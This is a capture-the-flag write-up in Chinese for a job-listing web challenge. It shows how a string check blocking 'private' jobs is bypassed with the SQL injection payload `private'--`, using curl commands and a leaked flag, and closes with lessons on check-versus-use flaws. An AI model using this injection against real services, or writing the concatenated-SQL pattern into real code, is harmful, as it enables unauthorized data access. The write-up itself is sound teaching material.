## 题解

### 入口与指纹

`uvicorn`（FastAPI）单端口。首页是 `Ultimate Job Aggregator`，一个下拉框筛选岗位类型：
`All` / `back-end` / `front-end` / **`private`**。

前端把选项值 POST 给 `/jobs`：

```javascript
fetch('/jobs', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ job_type: jobType })
})
```

`/openapi.json` 只暴露三个路由，且请求体 schema 为空（说明直接读 raw body）：

```text
POST /jobs
GET  /ping
GET  /
```

### 关键观察

**1. 未认证时 `/jobs` 已经能列出非私有岗位，且 ID 有缺口。**

```bash
curl -sS -H 'Content-Type: application/json' -d '{"job_type":""}' http://$T/jobs
# [{"id":1,...},{"id":2,...},{"id":4,...}]     <- 缺 id 3
```

id `3` 不在结果里，正是那个 `private` 岗位。

**2. `private` 被一条硬编码判断挡住。**

```bash
curl -s -d '{"job_type":"private"}' http://$T/jobs
# 403 {"detail": "Only admins can see private jobs"}
```

字符串精确比较，所以下面这些都不算触发：

| 输入 | 结果 |
| --- | --- |
| `"PRIVATE"` / `" private"` / `"private "` | 200 `[]` |
| `"priv%"` / `"%"` / `"privat_"` | 200 `[]`（说明用的是 `=` 不是 `LIKE`） |
| `{"job_type":["private"]}` / `{"job_type":null}` | 500（类型错误） |

**3. 但 `job_type` 的值被直接拼进 SQL。**

```bash
curl -s -d "{\"job_type\":\"private'--\"}" http://$T/jobs
# [{"id":3,"name":"Hidden job","type":"private",
#   "description":"flag{4022cc5c-f1d0-4a9e-919f-ef89fb0130c0}"}]
```

机制：服务端先做 `if job_type == "private": deny`，再拼 SQL
`... WHERE type = '<job_type>'`。`private'--` 不等于 `private`，所以**绕过了字符串判断**；
而它拼进 SQL 之后变成：

```sql
WHERE type = 'private'--'
```

`--` 注释掉剩下的引号，条件依然等于 `private`，于是正常返回私有岗位。

另一种形态 `private' OR '1'='1` 返回 500（说明 `'` 之后的语法在这个后端里不成立，
可能是 SQLite 对多引号的解析差异），但 `--` 就够了。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -H 'Content-Type: application/json' \
  --data-binary '{"job_type":"private'"'"'--"}' \
  "http://$T/jobs" | python3 -m json.tool
```

返回：

```json
[{"id": 3, "name": "Hidden job", "type": "private",
  "description": "flag{4022cc5c-f1d0-4a9e-919f-ef89fb0130c0}"}]
```

### flag 位置

`/jobs` 响应里 id=3（`Hidden job`）的 `description` 字段。

## 复盘

- **先看数据缺口再想绕过。** `/jobs` 返回 id `1,2,4`，缺 `3` —— 这个"缺失"直接指出
  有一条被隐藏的记录，比盲猜参数高效得多。
- **"权限判断"和"数据查询"是两条独立的代码路径。** 本题的鉴权是
  `if job_type == "private"` 的**字符串比较**，而查询是**字符串拼接**。
  只要让两者对同一个输入产生不同解读，就能绕过：
  - 鉴权看到 `private'--`（不是 `private`，放行）
  - SQL 看到 `type = 'private'--'`（等价于 `private`，命中）
  这是"检查与使用不一致"（check-vs-use）的典型形态。
- **`LIKE` vs `=` 要用通配符确认。** `%`、`priv%`、`privat_` 全部返回空，
  说明是精确匹配，因此通配符类绕过不成立，必须走 SQL 语法层面。
- **注释符是最短的闭合手段。** `--` 把尾部多余的单引号注释掉，比构造完整的
  `' OR '1'='1` 更稳（后者在这个后端反而 500）。
- **类型混乱会暴露实现。** `job_type: null` 和 `job_type: [...]` 返回 500，
  说明服务端对它做了字符串操作（拼接/SQL），而不是简单的白名单枚举——
  这是"该参数可能进 SQL"的一个廉价信号。
